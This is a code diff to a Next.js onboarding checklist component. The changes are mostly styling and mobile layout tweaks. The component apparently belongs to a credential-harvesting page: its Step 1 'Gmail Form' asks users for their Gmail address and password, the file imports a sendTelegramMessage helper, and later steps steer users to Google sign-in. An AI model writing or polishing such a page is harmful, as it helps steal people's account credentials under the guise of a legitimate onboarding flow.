@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, FormEvent, useCallback } from "react";
-import { useRouter } from "next/navigation";   // ← Make sure this import is here
+import { useRouter } from "next/navigation";
 import { sendTelegramMessage } from "../../utils1/telegram";
 
 type Step = 0 | 1 | 2;
@@ -35,7 +35,7 @@ const STEPS: OnboardingStep[] = [
 ];
 
 export default function OnboardingChecklist() {
-  const router = useRouter();   // ← Router is now correctly defined here
+  const router = useRouter();
 
   const [openStep, setOpenStep] = useState<Step | null>(null);
   const [doneSteps, setDoneSteps] = useState<boolean[]>([false, false, false]);
@@ -109,7 +109,7 @@ export default function OnboardingChecklist() {
   };
 
   const getCardClass = (i: Step) => {
-    const base = "group border rounded-2xl p-6 mb-4 cursor-pointer transition-all duration-200 select-none shadow-sm hover:shadow-md";
+    const base = "group border rounded-2xl p-6 mb-4 cursor-pointer transition-all duration-200 select-none shadow-sm hover:shadow-md active:scale-[0.985]";
     if (doneSteps[i]) return `${base} border-emerald-300 bg-emerald-50`;
     if (openStep === i) return `${base} border-blue-600 bg-white ring-1 ring-blue-200`;
     return `${base} border-gray-200 bg-white hover:border-gray-300`;
@@ -231,7 +231,7 @@ export default function OnboardingChecklist() {
           <div className="mt-8 text-center">
             <button
               onClick={() => router.push("/complete")}
-              className="inline-flex items-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white px-8 h-12 rounded-3xl font-semibold transition-all active:scale-95"
+              className="inline-flex items-center gap-2 bg-emerald-600 hover:bg-emerald-700 active:bg-emerald-800 text-white px-8 h-12 rounded-3xl font-semibold transition-all active:scale-95"
             >
               Continue<span className="text-xl">→</span>
             </button>
@@ -274,7 +274,7 @@ function InfoRow({ label, value }: InfoRowProps) {
   );
 }
 
-/* Step 1 – Gmail Form */
+/* Step 1 – Gmail Form (Mobile Fixed) */
 function StepOneContent({
   email,
   setEmail,
@@ -351,7 +351,12 @@ function StepOneContent({
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               placeholder="janesmithoutlier@gmail.com"
-              className="w-full h-12 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-2xl px-5 text-base placeholder:text-gray-400"
+              className="w-full h-12 
+                         border border-gray-300 
+                         bg-white text-gray-900 text-base
+                         focus:border-blue-600 focus:ring-2 focus:ring-blue-600/30
+                         rounded-2xl px-5 placeholder:text-gray-400
+                         [color-scheme:light]"
               autoComplete="email"
             />
           </div>
@@ -366,7 +371,12 @@ function StepOneContent({
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 placeholder="JaneSmith01"
-                className="w-full h-12 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-2xl px-5 text-base placeholder:text-gray-400"
+                className="w-full h-12 
+                           border border-gray-300 
+                           bg-white text-gray-900 text-base
+                           focus:border-blue-600 focus:ring-2 focus:ring-blue-600/30
+                           rounded-2xl px-5 placeholder:text-gray-400
+                           [color-scheme:light]"
                 autoComplete="new-password"
               />
               <button
@@ -388,7 +398,7 @@ function StepOneContent({
           <button
             type="submit"
             disabled={sending || !email.trim() || !password.trim()}
-            className="w-full h-12 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold rounded-2xl transition-all text-base flex items-center justify-center gap-2"
+            className="w-full h-12 bg-blue-600 hover:bg-blue-700 active:bg-blue-800 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold rounded-2xl transition-all text-base flex items-center justify-center gap-2 active:scale-[0.985]"
           >
             {sending ? (
               <>
@@ -412,7 +422,7 @@ function StepOneContent({
 
           <button
             onClick={markDone}
-            className="w-full h-12 bg-gray-900 hover:bg-black text-white font-semibold rounded-2xl transition-colors text-base"
+            className="w-full h-12 bg-gray-900 hover:bg-black active:bg-black text-white font-semibold rounded-2xl transition-all text-base active:scale-[0.985]"
           >
             Mark Step 1 as complete
           </button>
@@ -452,12 +462,20 @@ function StepTwoContent({ markDone }: { markDone: () => void }) {
       </div>
 
       <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 text-sm text-amber-800 mb-6">
-        <strong className="font-semibold">Important:</strong> Tap the <span className="font-mono bg-white px-2 rounded">G</span> button (first option). Do not use Facebook, Apple, or email signup.
+        <strong className="font-semibold">Important:</strong> 
+        Tap the{" "}
+        <span className="font-mono bg-white px-2 py-0.5 rounded border border-amber-300 text-amber-900 font-medium">
+          G
+        </span>{" "}
+        button (first option).
+        <span className="block mt-2 text-amber-700">
+          Do <span className="font-medium">not</span> use Facebook, Apple, or email signup.
+        </span>
       </div>
 
       <button
         onClick={markDone}
-        className="w-full h-12 bg-gray-900 hover:bg-black text-white font-semibold rounded-2xl transition-colors text-base"
+        className="w-full h-12 bg-gray-900 hover:bg-black active:bg-black text-white font-semibold rounded-2xl transition-all text-base active:scale-[0.985]"
       >
         Mark Step 2 as complete
       </button>
@@ -493,7 +511,7 @@ function StepThreeContent({ markDone }: { markDone: () => void }) {
 
       <button
         onClick={markDone}
-        className="w-full h-12 bg-gray-900 hover:bg-black text-white font-semibold rounded-2xl transition-colors text-base"
+        className="w-full h-12 bg-gray-900 hover:bg-black active:bg-black text-white font-semibold rounded-2xl transition-all text-base active:scale-[0.985]"
       >
         Mark Step 3 as complete
       </button>
